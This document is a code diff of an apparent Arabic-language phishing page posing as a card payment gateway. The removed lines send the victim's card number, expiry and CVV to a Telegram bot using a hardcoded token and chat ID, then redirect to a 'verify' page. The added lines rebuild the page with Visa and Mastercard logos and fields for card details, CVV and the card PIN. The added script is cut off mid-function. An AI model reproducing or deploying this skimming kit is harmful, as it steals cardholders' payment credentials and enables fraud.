@@ -1,52 +1,49 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>صفحة الدفع</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>بوابة الدفع الآمنة</title>
   <style>
-    body {font-family: Tahoma, Arial; background:#f9f9f9; margin:0; padding:0;}
-    .container {max-width:400px; margin:50px auto; background:#eef7ff; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
-    h2 {text-align:center; color:#1e5a9c; margin-bottom:20px;}
-    label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
-    input, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
-    button {background:#1e5a9c; color:white; font-weight:bold; cursor:pointer; border:none;}
-    button:hover {background:#14406d;}
+    body{font-family:"Tajawal",Arial,sans-serif;direction:rtl;background:#f5f5f5;margin:0;padding:0;display:flex;flex-direction:column;min-height:100vh;}
+    header{background:#004080;color:#fff;text-align:center;padding:16px;}
+    .card-logos{display:flex;justify-content:center;gap:20px;flex-wrap:wrap;}
+    .card-logos img{height:40px;max-width:100%;}
+    main{flex:1;display:grid;place-items:center;padding:20px;}
+    form{background:#fff;padding:20px;border-radius:12px;width:min(500px,100%);box-shadow:0 0 12px rgba(0,0,0,.12);}
+    label{display:block;margin-top:12px;font-size:14px;font-weight:600;}
+    input,select{width:100%;padding:10px;margin-top:6px;border:1px solid #ccc;border-radius:6px;font-size:14px;box-sizing:border-box;}
+    button{margin-top:20px;padding:12px;width:100%;background:#004080;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;transition:background .2s;}
+    button:hover{background:#002b5c;}
+    footer{background:#1f2937;color:#fff;text-align:center;padding:14px;font-size:13px;}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>بيانات الدفع</h2>
-    <label for="card">رقم البطاقة</label>
-    <input type="text" id="card" placeholder="xxxx xxxx xxxx xxxx">
-
-    <label for="expiry">تاريخ الانتهاء</label>
-    <input type="text" id="expiry" placeholder="MM/YY">
-
-    <label for="cvv">CVV</label>
-    <input type="text" id="cvv" placeholder="3 أرقام خلف البطاقة">
-
-    <button onclick="sendPayment()">إرسال الدفع</button>
-  </div>
-
-  <script>
-    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
-    const CHAT_ID = "16420566";
-
-    function sendPayment() {
-      const card = document.getElementById("card").value;
-      const expiry = document.getElementById("expiry").value;
-      const cvv = document.getElementById("cvv").value;
-
-      const message = `💳 محاولة دفع:\nرقم البطاقة: ${card}\nانتهاء: ${expiry}\nCVV: ${cvv}`;
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: message})
-      }).then(() => {
-        window.location.href = "verify.html";
-      });
-    }
-  </script>
-</body>
-</html>
+  <header>
+    <div class="card-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard">
+    </div>
+  </header>
+  <main>
+    <form id="paymentForm">
+      <label for="confirmBooking">تأكيد رقم الحجز:</label>
+      <input id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+      <label for="cardNumber">رقم البطاقة:</label>
+      <input id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />
+      <label for="cardName">الاسم الموجود على البطاقة:</label>
+      <input id="cardName" required />
+      <label for="expiryMonth">الشهر (MM):</label>
+      <select id="expiryMonth" required><option value="">--</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option><option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option></select>
+      <label for="expiryYear">السنة (YYYY):</label>
+      <select id="expiryYear" required><option value="">--</option><option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select>
+      <label for="cvv">CVV (3 أو 4 أرقام):</label>
+      <input id="cvv" minlength="3" maxlength="4" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+      <label for="pin">الرقم السري (PIN):</label>
+      <input id="pin" type="password" maxlength="4" required oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)" />
+      <button type="submit">ادفع الآن</button>
+    </form>
+  </main>
+  <footer>© جميع الحقوق محفوظة 2025 • البوابة الإلكترونية</footer>
+<script>
+  function formatCardNumber(input){let v=input.value.replace(/[^0-9]/g,"");v=v.slice(0,16);let f=v.match(/.{1,4}/g);
